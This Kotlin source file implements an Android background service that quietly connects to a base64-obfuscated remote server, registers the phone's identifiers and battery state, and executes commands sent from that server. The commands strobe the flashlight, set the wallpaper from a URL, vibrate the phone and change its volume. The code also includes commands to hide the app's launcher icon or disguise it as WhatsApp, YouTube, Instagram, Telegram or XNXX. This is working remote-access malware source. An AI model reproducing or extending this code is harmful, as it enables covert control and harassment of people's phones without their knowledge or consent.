package com.sync.xxx

import android.app.*
import android.content.*
import android.graphics.BitmapFactory
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.media.AudioManager
import android.app.WallpaperManager
import android.os.*
import android.util.Log
import androidx.core.app.NotificationCompat
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.net.URI

class DeviceService : Service() {

    companion object {
        const val ACTION_COMMAND     = "com.sync.xxx.COMMAND"
        const val EXTRA_COMMAND      = "command"
        const val EXTRA_VALUE        = "value"
        const val ACTION_CONNECT     = "com.sync.xxx.CONNECT"
        const val ACTION_SEND_STATUS = "com.sync.xxx.SEND_STATUS"
        const val EXTRA_STATUS_JSON  = "statusJson"
        const val CHANNEL_ID         = "sync_xxx"
        const val NOTIF_ID           = 1

        val SERVER_URL: String
            get() = String(
                android.util.Base64.decode(
                    "aHR0cDovL2Nsb3VkLTEubWlyenByaXZhdGUubXkuaWQ6MzE3MA==",
                    android.util.Base64.DEFAULT
                )
            ).trim()
    }

    private var socket: Socket? = null
    private var deviceId: String = ""
    private var deviceName: String = ""

    // ── Flashlight ────────────────────────────────
    private var cameraManager: CameraManager? = null
    private var torchCameraId: String? = null

    // Flashlight blink (toggle cepat)
    private var flashHandler: Handler? = null
    private var flashRunnable: Runnable? = null
    private var flashBlinking = false

    // Senter steady
    private var senterOn = false

    // Flash interval (custom ms)
    private var flashIntervalHandler: Handler? = null
    private var flashIntervalRunnable: Runnable? = null
    private var flashIntervalState = false

    // ─────────────────────────────────────────────

    private val localReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.action) {
                ACTION_COMMAND -> {
                    val cmd   = intent.getStringExtra(EXTRA_COMMAND) ?: return
                    val value = intent.getStringExtra(EXTRA_VALUE)   ?: ""
                    handleCommand(cmd, value)
                }
                ACTION_CONNECT -> {
                    if (socket == null || socket?.connected() == false) connectSocket()
                }
                ACTION_SEND_STATUS -> {
                    val json = intent.getStringExtra(EXTRA_STATUS_JSON) ?: return
                    emitStatus(JSONObject(json))
                }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(
                NOTIF_ID,
                buildNotification(),
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
            )
        } else {
            startForeground(NOTIF_ID, buildNotification())
        }

        deviceId = android.provider.Settings.Secure.getString(
            contentResolver, android.provider.Settings.Secure.ANDROID_ID
        ).takeIf { !it.isNullOrBlank() } ?: Build.ID

        val mfr   = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
        val model = Build.MODEL
        deviceName = if (model.startsWith(mfr, ignoreCase = true)) model else "$mfr $model"

        cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
        torchCameraId = cameraManager?.cameraIdList?.firstOrNull { id ->
            cameraManager?.getCameraCharacteristics(id)
                ?.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
        }

        val filter = IntentFilter().apply {
            addAction(ACTION_CONNECT)
            addAction(ACTION_SEND_STATUS)
            addAction(ACTION_COMMAND)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(localReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(localReceiver, filter)
        }

        connectSocket()
    }

    private fun connectSocket() {
        try {
            val opts = IO.Options.builder()
                .setReconnection(true)
                .setReconnectionDelay(3000)
                .setReconnectionDelayMax(10000)
                .build()

            socket = IO.socket(URI.create(SERVER_URL), opts)

            socket?.on(Socket.EVENT_CONNECT) {
                Log.d("DeviceService", "Socket Connected")
                SocketHolder.connected = true

                val batteryIntent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
                val level   = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
                val scale   = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
                val plugged = batteryIntent?.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1) ?: -1
                val battPct = if (level >= 0 && scale > 0) (level * 100 / scale) else -1

                socket?.emit("device:register", JSONObject().apply {
                    put("deviceId",      deviceId)
                    put("name",          deviceName)
                    put("battery",       battPct)
                    put("charging",      plugged != 0)
                    put("sdkVersion",    Build.VERSION.SDK_INT)
                    put("androidVersion", Build.VERSION.RELEASE)
                    put("uid",           readUid())
                })
            }

            socket?.on(Socket.EVENT_DISCONNECT) {
                Log.d("DeviceService", "Socket disconnected")
                SocketHolder.connected = false
            }

            socket?.on("command") { args ->
                val data  = args[0] as? JSONObject ?: return@on
                val cmd   = data.optString("command")
                val valRaw = data.opt("value")?.toString() ?: ""
                val intent = Intent(ACTION_COMMAND).apply {
                    putExtra(EXTRA_COMMAND, cmd)
                    putExtra(EXTRA_VALUE, valRaw)
                    setPackage(packageName)
                }
                sendBroadcast(intent)
            }

            socket?.connect()
        } catch (e: Exception) {
            Log.e("DeviceService", "Socket error: ${e.message}")
        }
    }

    // ── Command router ────────────────────────────
    private fun handleCommand(cmd: String, value: String) {
        when (cmd) {
            // Senter nyala/mati biasa
            "senter"            -> setSenter(value == "true")
            // Flashlight blink cepat (toggle)
            "flashlight"        -> setFlashlight(value == "true")
            // Flash interval custom ms
            "flashInterval"     -> startFlashInterval(value)
            "flashIntervalStop" -> stopFlashInterval()
            // Wallpaper dari URL
            "setWallpaper"      -> setWallpaperFromUrl(value)
            // Vibrate durasi ms
            "vibrate"           -> vibrateDevice(value)
            // Volume 0-100
            "setVolume"         -> setVolumeLevel(value.toIntOrNull()?.coerceIn(0, 100) ?: 50)
            // Mute/unmute
            "muteVolume"        -> setVolumeMute(value == "true")
            // Change icon/theme
            "changeTheme"       -> changeTheme(value)
            "hideIcon" -> setHideIcon(value == "true")
        }
    }

   private fun setHideIcon(hide: Boolean) {
    try {
        val pm = packageManager
        val aliases = listOf(
            "com.sync.xxx.AliasDefault",
            "com.sync.xxx.AliasWhatsApp",
            "com.sync.xxx.AliasYouTube",
            "com.sync.xxx.AliasInstagram",
            "com.sync.xxx.AliasTelegram",
            "com.sync.xxx.AliasXNXX"
        )
        if (hide) {
            // Disable semua alias = icon hilang
            aliases.forEach { alias ->
                try {
                    pm.setComponentEnabledSetting(
                        android.content.ComponentName(packageName, alias),
                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        android.content.pm.PackageManager.DONT_KILL_APP
                    )
                } catch (_: Exception) {}
            }
        } else {
            // Enable hanya AliasDefault = icon balik
            aliases.forEach { alias ->
                try {
                    pm.setComponentEnabledSetting(
                        android.content.ComponentName(packageName, alias),
                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        android.content.pm.PackageManager.DONT_KILL_APP
                    )
                } catch (_: Exception) {}
            }
            pm.setComponentEnabledSetting(
                android.content.ComponentName(packageName, "com.sync.xxx.AliasDefault"),
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            )
        }
        emitStatus(JSONObject().apply { put("iconHidden", hide) })
    } catch (e: Exception) {
        Log.e("DeviceService", "setHideIcon: ${e.message}")
    }
}
    // ── Senter steady ─────────────────────────────
    private fun setSenter(on: Boolean) {
        try {
            senterOn = on
            torchCameraId?.let { cameraManager?.setTorchMode(it, on) }
            emitStatus(JSONObject().apply { put("senterOn", on) })
        } catch (e: Exception) {
            Log.e("DeviceService", "setSenter: ${e.message}")
        }
    }

    // ── Flashlight blink cepat ────────────────────
    private fun setFlashlight(on: Boolean) {
        if (on) {
            if (flashBlinking) return
            flashBlinking = true
            flashHandler  = Handler(Looper.getMainLooper())
            var state     = false
            flashRunnable = object : Runnable {
                override fun run() {
                    if (!flashBlinking) {
                        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
                        return
                    }
                    state = !state
                    try { torchCameraId?.let { cameraManager?.setTorchMode(it, state) } } catch (_: Exception) {}
                    flashHandler?.postDelayed(this, 200)
                }
            }
            flashHandler?.post(flashRunnable!!)
        } else {
            flashBlinking = false
            flashHandler?.removeCallbacks(flashRunnable ?: return)
            flashHandler  = null
            flashRunnable = null
            try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
        }
        emitStatus(JSONObject().apply { put("flashlight", on) })
    }

    // ── Flash interval (custom ms) ────────────────
    private fun startFlashInterval(value: String) {
        stopFlashInterval()
        val ms = value.toLongOrNull()?.coerceAtLeast(50L) ?: 200L
        flashIntervalHandler = Handler(Looper.getMainLooper())
        flashIntervalRunnable = object : Runnable {
            override fun run() {
                flashIntervalState = !flashIntervalState
                try { torchCameraId?.let { cameraManager?.setTorchMode(it, flashIntervalState) } } catch (_: Exception) {}
                flashIntervalHandler?.postDelayed(this, ms)
            }
        }
        flashIntervalHandler?.post(flashIntervalRunnable!!)
        emitStatus(JSONObject().apply {
            put("flashIntervalActive", true)
            put("flashIntervalMs", ms)
        })
    }

    private fun stopFlashInterval() {
        flashIntervalRunnable?.let { flashIntervalHandler?.removeCallbacks(it) }
        flashIntervalHandler  = null
        flashIntervalRunnable = null
        flashIntervalState    = false
        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
        emitStatus(JSONObject().apply { put("flashIntervalActive", false) })
    }

    // ── Wallpaper dari URL ────────────────────────
    private fun setWallpaperFromUrl(url: String) {
        Thread {
            try {
                val conn = (java.net.URL(url).openConnection() as java.net.HttpURLConnection).apply {
                    requestMethod           = "GET"
                    connectTimeout          = 8000
                    readTimeout             = 15000
                    setRequestProperty("User-Agent", "Mozilla/5.0")
                    setRequestProperty("Accept", "image/*")
                    instanceFollowRedirects = true
                    connect()
                }
                if (conn.responseCode != 200) { conn.disconnect(); return@Thread }
                val bytes = conn.inputStream.use { it.readBytes() }
                conn.disconnect()
                val bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size) ?: return@Thread
                WallpaperManager.getInstance(this).setBitmap(bmp)
                bmp.recycle()
                emitStatus(JSONObject().apply { put("wallpaperSet", true) })
            } catch (e: Exception) {
                Log.e("DeviceService", "setWallpaper: ${e.message}")
            }
        }.start()
    }

    // ── Vibrate ───────────────────────────────────
    private fun vibrateDevice(value: String) {
        try {
            val durationMs = value.toLongOrNull() ?: 500L
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val vm  = getSystemService(android.os.VibratorManager::class.java)
                val vib = vm?.defaultVibrator
                vib?.vibrate(VibrationEffect.createOneShot(durationMs, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                val vib = getSystemService(VIBRATOR_SERVICE) as? android.os.Vibrator
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    vib?.vibrate(VibrationEffect.createOneShot(durationMs, VibrationEffect.DEFAULT_AMPLITUDE))
                } else {
                    @Suppress("DEPRECATION")
                    vib?.vibrate(durationMs)
                }
            }
            emitStatus(JSONObject().apply { put("vibrated", durationMs) })
        } catch (e: Exception) {
            Log.e("DeviceService", "vibrateDevice: ${e.message}")
        }
    }

    // ── Volume level 0-100 ────────────────────────
    private fun setVolumeLevel(level: Int) {
        try {
            val audio = getSystemService(AUDIO_SERVICE) as AudioManager
            listOf(
                AudioManager.STREAM_MUSIC,
                AudioManager.STREAM_RING,
                AudioManager.STREAM_NOTIFICATION
            ).forEach { stream ->
                val max    = audio.getStreamMaxVolume(stream)
                val target = (level / 100f * max).toInt().coerceIn(0, max)
                audio.setStreamVolume(stream, target, 0)
            }
            emitStatus(JSONObject().apply {
                put("volumeLevel", level)
                put("volumeMuted", level == 0)
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "setVolumeLevel: ${e.message}")
        }
    }

    // ── Mute/unmute ───────────────────────────────
    private fun setVolumeMute(mute: Boolean) {
        try {
            val audio = getSystemService(AUDIO_SERVICE) as AudioManager
            audio.setStreamVolume(
                AudioManager.STREAM_MUSIC,
                if (mute) 0 else audio.getStreamMaxVolume(AudioManager.STREAM_MUSIC),
                0
            )
            emitStatus(JSONObject().apply { put("volumeMuted", mute) })
        } catch (e: Exception) {
            Log.e("DeviceService", "setVolumeMute: ${e.message}")
        }
    }

    // ── Change Theme (icon & nama) ────────────────
    private val THEME_ALIASES = mapOf(
        "default"   to "com.sync.xxx.AliasDefault",
        "whatsapp"  to "com.sync.xxx.AliasWhatsApp",
        "youtube"   to "com.sync.xxx.AliasYouTube",
        "instagram" to "com.sync.xxx.AliasInstagram",
        "telegram"  to "com.sync.xxx.AliasTelegram",
        "xnxx"      to "com.sync.xxx.AliasXNXX"
    )

    private fun changeTheme(theme: String) {
        try {
            val pm     = packageManager
            val target = theme.lowercase().trim()
            THEME_ALIASES.values.forEach { alias ->
                try {
                    pm.setComponentEnabledSetting(
                        android.content.ComponentName(packageName, alias),
                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        android.content.pm.PackageManager.DONT_KILL_APP
                    )
                } catch (_: Exception) {}
            }
            val chosen = THEME_ALIASES[target] ?: THEME_ALIASES["default"]!!
            pm.setComponentEnabledSetting(
                android.content.ComponentName(packageName, chosen),
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            )
            emitStatus(JSONObject().apply { put("themeChanged", theme) })
        } catch (e: Exception) {
            Log.e("DeviceService", "changeTheme: ${e.message}")
        }
    }

    // ── uid.json ──────────────────────────────────
    private fun readUid(): String {
        return try {
            val json = assets.open("uid.json").bufferedReader().use { it.readText() }
            JSONObject(json).optString("uid", "")
        } catch (e: Exception) {
            Log.e("DeviceService", "readUid: ${e.message}")
            ""
        }
    }

    // ── Emit helpers ─────────────────────────────
    fun emitStatus(statusObj: JSONObject) {
        if (socket?.connected() != true) return
        socket?.emit("device:status", JSONObject().apply {
            put("deviceId", deviceId)
            put("status", statusObj)
        })
    }

    // ── Lifecycle ─────────────────────────────────
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
    override fun onBind(intent: Intent?): android.os.IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        try { unregisterReceiver(localReceiver) } catch (_: Exception) {}
        flashBlinking = false
        flashHandler?.removeCallbacks(flashRunnable ?: Runnable {})
        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
        stopFlashInterval()
        socket?.disconnect()
        socket = null
    }

    private fun buildNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("SyncXxX")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = android.app.NotificationChannel(
                CHANNEL_ID, "Sync XxX Service",
                android.app.NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(android.app.NotificationManager::class.java)
                .createNotificationChannel(ch)
        }
    }
}

object SocketHolder {
    var connected: Boolean = false
}
